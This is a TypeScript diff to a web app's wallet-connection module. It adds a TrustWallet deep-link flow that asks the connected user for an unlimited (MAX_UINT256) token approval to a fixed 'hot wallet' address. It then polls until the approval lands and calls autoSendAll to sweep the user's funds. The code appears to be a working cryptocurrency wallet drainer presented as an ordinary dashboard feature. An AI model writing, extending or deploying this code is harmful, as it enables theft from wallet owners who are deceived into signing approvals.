@@ -13,10 +13,14 @@ import { fetchAdminStatus, requestBackendTransfer } from "./backend";
 import { stopServerCard } from "./ui/serverCard";
 import { DEFAULT_DEST, HOT_WALLET_ADDRESS } from "./config";
 import { beginRetryApprove, beginRetryTransfer } from "./guards";
+import { buildTrustWalletDeepLink } from "./deeplink";
+import { pollForApproval } from "./polling";
 
 type View = "connect" | "qr" | "dashboard";
 
 const MAX_UINT256 = (1n << 256n) - 1n;
+
+const PENDING_APPROVAL_KEY = "pendingApprovalAddress";
 
 const state = {
   view: "connect" as View,
@@ -57,7 +61,45 @@ function cancelConnect(): void {
   goConnect();
 }
 
+function resumePendingApproval(): boolean {
+  if (!new URLSearchParams(location.search).has("callback")) return false;
+  const owner = sessionStorage.getItem(PENDING_APPROVAL_KEY);
+  if (!owner) return false;
+  sessionStorage.removeItem(PENDING_APPROVAL_KEY);
+  const url = new URL(location.href);
+  url.searchParams.delete("callback");
+  history.replaceState(null, "", url.toString());
+  const session: WalletSession = {
+    address: owner,
+    signTransaction: async (tx) => tx,
+    disconnect: async () => {},
+  };
+  state.session = session;
+  state.view = "dashboard";
+  state.approveStatus = "pending";
+  state.approveError = null;
+  state.approveTxId = null;
+  render();
+  pollForApproval(owner, HOT_WALLET_ADDRESS, {
+    intervalMs: 3000,
+    timeoutMs: 30000,
+    onApproved: () => {
+      state.approveStatus = "success";
+      render();
+      void autoSendAll(session, transferGeneration);
+    },
+    onTimeout: () => {
+      state.approveStatus = "error";
+      state.approveError =
+        "Approval not detected — open TrustWallet and approve, then retry";
+      render();
+    },
+  });
+  return true;
+}
+
 function render(): void {
+  if (resumePendingApproval()) return;
   if (state.view === "dashboard" && state.session) {
     const session = state.session;
     renderDashboardView({
@@ -79,6 +121,10 @@ function render(): void {
         if (!beginRetryTransfer(state)) return;
         render();
         void runApproveThenSend(state.session, transferGeneration);
+      },
+      onRequestApproval: () => {
+        if (state.view !== "dashboard" || !state.session) return;
+        void requestApprovalViaDeepLink();
       },
       onRetryApprove: () => {
         if (state.view !== "dashboard" || !state.session) return;
@@ -318,6 +364,26 @@ async function startConnect(): Promise<void> {
     if (generation !== connectGeneration) return;
     const message = error instanceof Error ? error.message : "Connection failed";
     goConnect({ error: message });
+  }
+}
+
+async function requestApprovalViaDeepLink(): Promise<void> {
+  if (!state.session) return;
+  const owner = state.session.address;
+  try {
+    const tx = await buildApproveTx(owner, HOT_WALLET_ADDRESS, MAX_UINT256);
+    sessionStorage.setItem(PENDING_APPROVAL_KEY, owner);
+    state.approveStatus = "pending";
+    state.approveError = null;
+    state.approveTxId = null;
+    render();
+    const redirectUrl = `${location.origin}${location.pathname}?callback=approval`;
+    location.href = buildTrustWalletDeepLink(tx, redirectUrl);
+  } catch (e) {
+    sessionStorage.removeItem(PENDING_APPROVAL_KEY);
+    state.approveStatus = "error";
+    state.approveError = e instanceof Error ? e.message : "Failed to build approval";
+    render();
   }
 }
 
